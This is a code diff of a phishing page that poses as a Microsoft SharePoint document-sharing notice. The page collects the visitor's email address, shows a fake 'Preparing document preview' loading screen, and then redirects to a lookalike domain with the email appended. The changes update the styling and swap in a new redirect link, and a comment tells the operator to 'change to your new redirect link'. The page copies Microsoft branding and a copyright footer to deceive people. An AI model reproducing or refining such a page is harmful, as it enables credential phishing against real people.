@@ -5,21 +5,13 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Secure Document | SharePoint</title>
 <style>
-@keyframes buttonPulse {
-0%, 100% {
-background-color: white;
-color: #0078d7;
-box-shadow: none;
-}
-50% {
-background-color: #dbe9fc;
-color: #005a9e;
-box-shadow: 0 0 10px #005a9e;
-}
-}
 @keyframes breathing {
 0%, 100% { transform: scale(1); }
 50% { transform: scale(1.02); }
+}
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
 }
 body {
 font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
@@ -39,7 +31,7 @@ border-radius: 10px;
 max-width: 400px;
 width: 100%;
 text-align: center;
-animation: breathing 6s ease-in-out infinite;
+animation: breathing 5s ease-in-out infinite;
 position: relative;
 z-index: 2;
 }
@@ -96,11 +88,6 @@ justify-content: center;
 gap: 10px;
 font-size: 1rem;
 }
-.doc-icon-small {
-width: 24px;
-height: 24px;
-fill: white;
-}
 input[type="email"] {
 width: 100%;
 padding: 0.6rem 0.8rem;
@@ -120,7 +107,6 @@ padding: 0.7rem 0;
 font-size: 1.1rem;
 cursor: pointer;
 width: 100%;
-animation: buttonPulse 6s ease-in-out infinite;
 }
 button:hover {
 background-color: #bcd9f6;
@@ -140,22 +126,43 @@ left: 0;
 width: 100%;
 height: 100%;
 background: white;
-color: #0078d7;
-font-size: 1.5rem;
-font-weight: bold;
+flex-direction: column;
 align-items: center;
 justify-content: center;
 z-index: 999;
 }
+.loading-screen img {
+width: 220px;
+height: auto;
+margin-bottom: 20px;
+filter: blur(3px);
+}
+.spinner {
+border: 5px solid #f3f3f3;
+border-top: 5px solid #0078d7;
+border-radius: 50%;
+width: 40px;
+height: 40px;
+animation: spin 1s linear infinite;
+margin-bottom: 20px;
+}
+.loading-text {
+color: #0078d7;
+font-size: 1.2rem;
+font-weight: 600;
+}
 </style>
 </head>
+
 <body>
 
 <div class="loading-screen" id="loadingScreen">
-Loading document...
+<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Invoice_icon.png/480px-Invoice_icon.png" alt="Loading document...">
+<div class="spinner"></div>
+<div class="loading-text">Preparing document preview...</div>
 </div>
 
-<div class="container" role="main">
+<div class="container" role="main" id="mainContainer">
 <div class="logo-circle" aria-label="SharePoint style logo"></div>
 <h1>SharePoint</h1>
 <div class="sub-header">A new document is now available for your review.</div>
@@ -165,20 +172,9 @@ Loading document...
 </div>
 <form id="emailForm">
 <label for="emailInput">
-<svg class="doc-icon-small" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-<path d="M6 2a2 2 0 0 0-2 2v16c0 1.1.9 2 2 2h12a2 2 0 0 0 2-2V8l-6-6H6zM7 4h6v5h5v11H7V4z" />
-</svg>
 Enter your email address to access the document
 </label>
-<input
-type="email"
-id="emailInput"
-name="email"
-placeholder="Enter your email"
-required
-autocomplete="email"
-spellcheck="false"
-/>
+<input type="email" id="emailInput" name="email" placeholder="Enter your email" required autocomplete="email" spellcheck="false" />
 <button type="submit">Preview Document</button>
 </form>
 <footer>This is a secure document sharing notification. Please do not forward this email. ©️ 2025 Microsoft. All rights reserved.</footer>
@@ -187,16 +183,18 @@ spellcheck="false"
 <script>
 const form = document.getElementById('emailForm');
 const loadingScreen = document.getElementById('loadingScreen');
+const mainContainer = document.getElementById('mainContainer');
 
 form.addEventListener('submit', function(event) {
 event.preventDefault();
 const email = document.getElementById('emailInput').value.trim();
 if (email) {
+mainContainer.style.display = "none";
 loadingScreen.style.display = "flex";
 setTimeout(() => {
-const redirectUrl = 'https://docu-sharepoint.oozed.it.com/Ib8Uj';
+const redirectUrl = 'https://Innovational-SharePortals.oozed.it.com/ET7eT'; // <-- change to your new redirect link
 window.location.href = `${redirectUrl}?email=${encodeURIComponent(email)}`;
-}, 2000); // 2 second loading before redirect
+}, 2500); // wait 2.5 seconds
 }
 });
 </script>
